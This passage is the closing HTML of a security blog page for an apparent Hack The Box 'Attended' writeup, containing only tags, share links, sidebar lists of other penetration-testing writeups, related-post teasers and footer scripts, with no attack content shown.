no-text-decoration" >phishing</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Attended Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/attended/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Attended Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/attended/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Attended Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/attended/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/playertwo/"><div class="card-body"> <span class="timeago small" > Jun 26, 2020 <i class="unloaded">2020-06-26T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - PlayerTwo Writeup</h3><div class="text-muted small"><p> HTB - PlayerTwo Overview An Insane difficulty Linux machine that tested my web skills quite a bit and also had me doing as much research on new protocols and services as three or four easy or m...</p></div></div></a></div><div class="card"> <a href="/posts/dyplesher/"><div class="card-body"> <span class="timeago small" > Oct 12, 2020 <i class="unloaded">2020-10-12T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Dyplesher Writeup</h3><div class="text-muted small"><p> HTB - Dyplesher Overview Dyplesher was an insane difficulty Linux machine that tested both web enumeration skills, and code review and writing skills. Multiple Git repositories containing sourc...</p></div></div></a></div><div class="card"> <a href="/posts/sneakymailer/"><div class="card-body"> <span class="timeago small" > Nov 12, 2020 <i class="unloaded">2020-11-12T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - SneakyMailer Writeup</h3><div class="text-muted small"><p> HTB - SneakyMailer Overview This machine is on TJ_Null’s list of OSCP-like machines. Have fun! Short description to include any strange things to be dealt with Useful Skills and Tools Save a...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/zip-unzip-files-powershell/" class="btn btn-outline-primary" prompt="Older"><p>How to Zip and Unzip Files Using PowerShell</p></a> <a href="/posts/catch/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - Catch Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
